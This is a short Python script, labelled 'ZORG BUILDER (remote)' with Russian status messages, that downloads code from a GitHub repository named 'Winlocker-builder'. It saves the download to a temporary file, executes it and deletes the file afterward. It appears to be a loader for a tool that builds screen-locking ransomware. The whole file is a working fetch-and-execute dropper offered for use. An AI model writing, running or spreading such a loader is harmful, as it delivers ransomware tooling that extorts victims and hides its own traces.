import os
import sys
import subprocess
import urllib.request

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(BASE_DIR)

PAYLOAD_URL = "https://raw.githubusercontent.com/w-pixel228/Winlocker-builder/refs/heads/main/Builder"

print("=" * 60)
print("  ZORG BUILDER (remote)")
print("=" * 60)

print("[*] Скачиваю билдер с GitHub...")
try:
    with urllib.request.urlopen(PAYLOAD_URL, timeout=60) as r:
        code = r.read().decode("utf-8")
except Exception as e:
    print(f"[!] Ошибка скачивания: {e}")
    input("Enter для выхода...")
    sys.exit(1)

tmp = os.path.join(BASE_DIR, "_builder_tmp.py")
with open(tmp, "w", encoding="utf-8") as f:
    f.write(code)
print("[+] Код скачан и сохранён во временный файл")

try:
    subprocess.run([sys.executable, tmp])
finally:
    try:
        if os.path.exists(tmp):
            os.remove(tmp)
            print("[+] Временный .py удалён")
    except: pass
